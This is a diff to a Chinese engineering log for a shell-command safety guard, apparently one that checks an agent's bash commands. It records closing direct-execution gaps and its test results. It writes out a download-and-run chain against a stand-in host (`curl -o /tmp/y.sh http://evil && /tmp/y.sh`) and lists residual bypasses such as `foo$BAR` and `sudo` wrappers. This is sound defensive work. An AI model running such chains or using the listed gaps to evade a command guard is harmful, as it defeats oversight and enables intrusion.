@@ -304,9 +304,37 @@ zdebug 实证 12 条误伤的写目标全是 `{path:"/repo", via:"cmd-arg"}` 凭
 **残余面（如实记档，不许失踪）**：
 
 - curl -o 下载执行（运行时创建、判读时缺席）变体同漏——造-执对不识别 curl -o 写通道（writerContent 只收重定向/echo/printf/cat/tee/heredoc），与 bash 同链同漏同构，非本刀引入
-- 动态直执（`/$VAR/x.sh`）不成 argv0（求值词=null）——hasOpaqueScriptExec/通道两处同口径不收，与 delta3 记档的动态词残余面同族
+- 动态直执（`/$VAR/x.sh`）不成 argv0（求值词=null）——hasOpaqueScriptExec/通道两处同口径不收，与 delta3 记档的动态词残余面同族【delta5 已收口：词文本口径 + 纯展开词保守收，见下节】
 - 生产层 checkBashCommandSafety 的 EXEC_FACE 与 dotExec SQL 豁免口径分裂（db.exec 纯 SQL 生产层保守拦）——旧保守面非本刀引入（delta4 建议②），记档随 M-bf4049a3 止血面收窄；jshell 等非 SCRIPT_RUNNERS 解释器载荷零判读（delta4 建议①）已补记 issue #1491
 
 **影响范围**：write-target-evaluator.ts（shellScriptFileArg 拆分+直执行位收编+牙1 同构）、guard-touchstone-allow/block.json（+3 双向门、TS-0a7d41ee 显式声明注记）、单测 +6；判读面收敛方向=「真存在/造出内容的不透明执行」从放行转 fail-closed/正面 BLOCK，缺席证明与显式声明两臂不动。
 
 **验证（delta4 轮）**：探针矩阵 14 形态全对（5 拦 + 7 对照 + probe10 攻击链双形转拦）；write-target-evaluator.test.ts 108→114 例；三件套 123/123 绿；judge 考试 795/82/105 全过、棘轮零新键（TS-0a7d41ee 机器依赖注记后复原）；corpus 守恒 921 恒等（TS-smrj 前缀扣减 58→61）。
+
+### delta5 复核补刀（U5 生产层直执扩面 + 动态直执词文本收口，2026-10-14）
+
+检视獭1360 delta5 复核 2 严重（wv 层扩面成立，但「双层转拦」验收未达成——生产层 U5 域不含直执行位 + 动态直执行位双层全漏 + 牙1 注释与记档自相矛盾），大獭裁决两严重全采纳、维持定级，口径明示「双层转拦 = wv + prod 两层均拦」。
+
+**机制判定**：本刀为既有机制收口（U5 规则域扩面 + isDirectExecArgv0 判定口径修正），不新增机制；唯二新增面（运行器族/受管服务脚本族 carve）是既有契约的域分工表述（frozen 测试的固化语义，非新豁免面）。
+
+**严重 1 修法：U5 同构扩直执行位（isDirectExecArgv0 第三处复用——一条语义一个接口）**：
+
+- guard-model-judge judgeBashFileScript 新增段首直执行位分支：词文本 `./x`、`/x` 排 `//` 与纯展开词收口的直执行位 → U5_BLOCK_MSG（文案括注扩「./file、/path/file 直接执行」）——「从文件读脚本执行，内容未经守卫逐条判定」语义同款适用，**U5 不看文件来历只看执行位**（造出来的与存量脚本一视同仁）——curl/cp 造+直执链生产层闭合（探针实测 prod:BLOCK）
+- **运行器族 carve**（isDirectExecScriptSeg 单接口，wv 三处 + U5 同源）：argv0 basename ∈ SHELL_INTERPRETERS∪{source,.}∪SCRIPT_RUNNERS（/usr/bin/python3 族）→ 脚本位在其参数/载荷，argv0 自身不当脚本——同时满足「绝对路径解释器不误拦」冻结契约（bash-safety-guard.test.ts [建议2] 例）与「同族不许自己打自己」裁决（本刀唯一放宽面：修正 delta4 把解释器绝对路径自身当脚本的误收）
+- **受管服务脚本族域分工 carve**（isManagedScriptWord：otter-buddy.sh/alpha.sh 词文本认领，含动态词原文）：该族已有拍板语义（SERVICE_SCRIPT 域路径限定+子命令限定 F20260916gsrd/gtlr；alpha.sh 为引导文案正道入口），不是不透明脚本，U5 直执分支不判——frozen 契约全保持（start/status/logs 放行、worktree 绝对路径脚本 stop 放行、`$(./scripts/otter-buddy.sh restart)` 仍走服务脚本文案）
+- 生产层存在性盲与 bash x 完全同构：`bash x` 与 `./x` 同判（wv 三态看 fs/声明、prod 一律拦）——absent 形态「wv 放/prod 拦」即 bash x 现状的镜像，非新差异
+
+**严重 2 修法：isDirectExecArgv0 改检词文本（动态直执行位收口）**：
+
+- 词文本 `./` 或 `/` 前缀（排 `//`）即收进通道，dynamic 由求值结果定；**纯展开词**（`$P`——词文本无可证的非路径形态）保守收进通道 → `$P`/`./$P`/`$DIR/x.sh` 走 script-path-dynamic fail-closed（与 `bash $P` 同款）——牙1 注释「动态脚本路径一律 fail-closed」与行为自此一致，delta4 记档「动态直执不成 argv0 不收」**已收口**
+- **新残余面（记档+单测钉死）**：非前缀动态命令位（`foo$BAR`）不收——取舍：纯展开词保守收（`$P` 攻击面）与词文本非空非路径前缀不收（`kill${IFS}…`/`foo$BAR` 等既有形态不误伤）划边界，改口径须同步记档（write-target-evaluator.test.ts「残余面（记档钉死）」例）；wrapper 剥除形态（`sudo /tmp/x.sh`）两层同缺（wv 本就不剥 wrapper，同构保持），随 wrapper 口径工单收
+
+**残余面更新（如实记档，不许失踪）**：
+
+- 动态直执不成 argv0 不收 → **delta5 已收口**（见严重 2）
+- **curl -o 造-执对同漏（wv 侧）维持记档**：链形态 `curl -o /tmp/y.sh http://evil && /tmp/y.sh` wv 侧仍走缺席证明放行（writerContent 只收重定向/echo/printf/cat/tee/heredoc，造-执对不识别 curl -o/cp 写通道）——**生产层已由 U5 扩面闭合**（拦截层闭合=攻击链实际拦断）；若要求 wv 侧也转 fail-closed，是造-执对收编 cp/curl -o 的独立工单（`>>` 同款「内容不可知→dynamic→fail-closed」机制已存在——探针实测 `>>` 链 wv:BLOCK/fail-closed/script-payload-dynamic），口径呈拍板，不并入本刀（工单面「只这两块面」）
+- EXEC_FACE 与 dotExec SQL 豁免口径分裂随 M-bf4049a3 不变
+
+**影响范围**：write-target-evaluator.ts（isDirectExecArgv0 词文本化+导出、isRunnerArgv0/isDirectExecScriptSeg 单接口、shellScriptFileArg/hasOpaqueScriptExec/牙1 三处同源）、guard-model-judge.ts（U5 直执分支 + isManagedScriptWord 域分工 + 文案括注）、单测 +16（wv 7 + prod 9，双向钉死：动态四形态/真存在直执/造+直执链拦截侧 + absent/运行器 carve/受管族/能力 8/foo$BAR 残余/裸命令名对照放行侧）；语义收敛面=「直执行位不透明执行」从两层放行转拦/fail-closed，唯一放宽面=解释器绝对路径 argv0（delta4 误收修正，frozen 契约要求）。
+
+**验证（delta5 轮）**：全仓 5562/5562 绿（364 文件；基线 5546 + 新增 16 = 5562 零回归）；write-target-evaluator.test.ts 114→121 例、bash-safety-guard.test.ts delta5 describe 新增 9 例；judge 考试 795/82/105 全过、棘轮零新键、corpus 守恒 921 恒等；探针复测（delta5-probe11/12 命令集）：单段真存在直执、动态四形态、`bash $P` 对照、curl/cp 造+直执链 **prod 全 BLOCK**；能力 8 cmdsub/import 两形态不误伤（wv 全绿）；真不存在 absent wv 放行、受管服务脚本族 frozen 全保持。
